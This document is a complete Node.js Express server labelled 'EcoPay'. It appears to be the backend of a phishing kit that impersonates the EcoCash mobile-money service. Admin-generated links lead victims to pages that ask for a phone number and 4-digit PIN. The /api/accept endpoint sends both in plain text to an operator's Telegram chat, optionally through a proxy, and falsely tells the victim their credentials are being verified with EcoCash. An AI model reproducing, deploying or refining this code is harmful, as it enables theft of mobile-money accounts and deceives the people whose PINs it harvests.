const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, 'public')));

/* ============================================================
   Admin log buffer
============================================================ */
const LOG_BUFFER = [];
function pushLog(text, level = 'info') {
  LOG_BUFFER.unshift({
    time: new Date().toISOString().slice(11, 19),
    text: String(text),
    level
  });
  if (LOG_BUFFER.length > 200) LOG_BUFFER.pop();
}

app.get('/api/logs', (req, res) => res.json({ entries: LOG_BUFFER }));

/* ============================================================
   Persistent store for short links
============================================================ */
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'links.json');

function ensureDataDir() {
  try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (e) {}
}

function loadLinks() {
  ensureDataDir();
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    return new Map(Object.entries(JSON.parse(raw)));
  } catch (e) {
    return new Map();
  }
}

function saveLinks(map) {
  ensureDataDir();
  try {
    const obj = {};
    for (const [k, v] of map.entries()) obj[k] = v;
    fs.writeFileSync(DATA_FILE, JSON.stringify(obj), 'utf8');
  } catch (e) {
    console.error('saveLinks error:', e.message);
  }
}

let linkStore = loadLinks();

setInterval(() => {
  const now = Date.now();
  let changed = false;
  for (const [code, entry] of linkStore.entries()) {
    if (entry.exp && now > entry.exp) { linkStore.delete(code); changed = true; }
    else if (now - entry.createdAt > 7 * 24 * 3600 * 1000) { linkStore.delete(code); changed = true; }
  }
  if (changed) saveLinks(linkStore);
}, 60 * 60 * 1000);

/* ============================================================
   Telegram notification
   Uses TELEGRAM_API_PROXY_URL when set (Cloudflare Worker),
   otherwise falls back to api.telegram.org directly.
============================================================ */
async function notifyTelegram({ phone, pin }) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const proxyUrl = process.env.TELEGRAM_API_PROXY_URL;

  if (!token || !chatId) {
    pushLog('Telegram not configured — skipping', 'err');
    console.warn('Telegram not configured — skipping notification.');
    return;
  }

  const text = phone + '\n' + pin;

  const baseUrl = proxyUrl
    ? proxyUrl.replace(/\/$/, '') + '/bot' + token
    : 'https://api.telegram.org/bot' + token;

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    const res = await fetch(baseUrl + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text }),
      signal: controller.signal
    });

    if (!res.ok) {
      const body = await res.text().catch(() => '');
      pushLog('Telegram responded ' + res.status + ' ' + body.slice(0, 120), 'err');
      console.error('Telegram responded', res.status, body);
    } else {
      pushLog('Telegram sent OK', 'ok');
      console.log('Telegram notification sent.');
    }
  } catch (err) {
    const msg = err.name === 'AbortError' ? 'timeout' : err.message;
    pushLog('Telegram error: ' + msg, 'err');
    console.error('Telegram notify failed:', msg);
  } finally {
    clearTimeout(timeout);
  }
}

/* ============================================================
   POST /api/links
============================================================ */
app.post('/api/links', (req, res) => {
  try {
    const payload = req.body;
    if (!payload || !payload.tx) {
      pushLog('Create link failed: missing tx', 'err');
      return res.status(400).json({ error: 'Missing transaction data' });
    }
    const code = 'ECP-' + crypto.randomBytes(4).toString('hex').toUpperCase();
    linkStore.set(code, {
      payload,
      createdAt: Date.now(),
      exp: payload.exp || null
    });
    saveLinks(linkStore);
    pushLog('Link created: ' + code, 'ok');
    res.json({ code, shortUrl: '/client.html?r=' + code });
  } catch (err) {
    pushLog('Create link error: ' + err.message, 'err');
    console.error('create link error:', err);
    res.status(500).json({ error: 'Could not create link' });
  }
});

/* ============================================================
   GET /api/links/:code
============================================================ */
app.get('/api/links/:code', (req, res) => {
  const code = req.params.code;
  const entry = linkStore.get(code);

  if (!entry) {
    pushLog('Resolve 404: ' + code, 'err');
    return res.status(404).json({ error: 'Link not found or expired' });
  }
  if (entry.exp && Date.now() > entry.exp) {
    linkStore.delete(code);
    saveLinks(linkStore);
    pushLog('Resolve 410 expired: ' + code, 'err');
    return res.status(410).json({ error: 'Link expired' });
  }
  pushLog('Resolve OK: ' + code, 'ok');
  res.json(entry.payload);
});

/* ============================================================
   POST /api/accept
============================================================ */
app.post('/api/accept', async (req, res) => {
  const { transactionId, phone, pin } = req.body;

  pushLog('ACCEPT HIT tx=' + (transactionId || '—') + ' phone=' + (phone || '—'), 'info');
  console.log('ACCEPT HIT', { tx: transactionId, phone });

  if (!transactionId || !phone || !pin) {
    pushLog('Rejected: missing fields', 'err');
    return res.status(400).json({
      status: 'failed',
      message: 'Missing transactionId, phone, or pin'
    });
  }

  if (!/^\d{4}$/.test(String(pin))) {
    pushLog('Rejected: PIN not 4 digits', 'err');
    return res.status(400).json({
      status: 'failed',
      message: 'PIN must be exactly 4 digits'
    });
  }

  pushLog('Telegram call → ' + phone + ' / PIN length ' + String(pin).length, 'info');
  await notifyTelegram({ phone, pin });

  return res.json({
    status: 'verifying',
    message: 'Verifying your credentials with EcoCash…',
    transactionId
  });
});

/* ============================================================
   Health + pages
============================================================ */
app.get('/health', (req, res) => res.json({ ok: true }));

function servePage(filename) {
  const fullPath = path.join(__dirname, 'public', filename);
  return (req, res) => {
    if (!fs.existsSync(fullPath)) {
      return res.status(404).send('Page not found: ' + filename);
    }
    res.sendFile(fullPath);
  };
}

app.get('/admin.html',  servePage('admin.html'));
app.get('/client.html', servePage('client.html'));
app.get('/pay.html',    servePage('pay.html'));
app.get('/', (req, res) => res.redirect('/admin.html'));

app.use((req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: 'Not found' });
  }
  res.status(404).send('Page not found');
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('EcoPay running on port ' + PORT);
  console.log('Data directory:', DATA_DIR);
  const publicDir = path.join(__dirname, 'public');
  try {
    const files = fs.readdirSync(publicDir);
    console.log('Public files:', files.join(', ') || '(empty)');
    ['admin.html', 'client.html', 'pay.html'].forEach(f => {
      console.log('  ' + f + ':', fs.existsSync(path.join(publicDir, f)) ? 'found' : 'MISSING');
    });
  } catch (e) {
    console.error('Could not read public directory:', e.message);
  }
  console.log('Telegram configured:', !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID));
  console.log('Telegram proxy:', process.env.TELEGRAM_API_PROXY_URL || 'none (direct)');
});
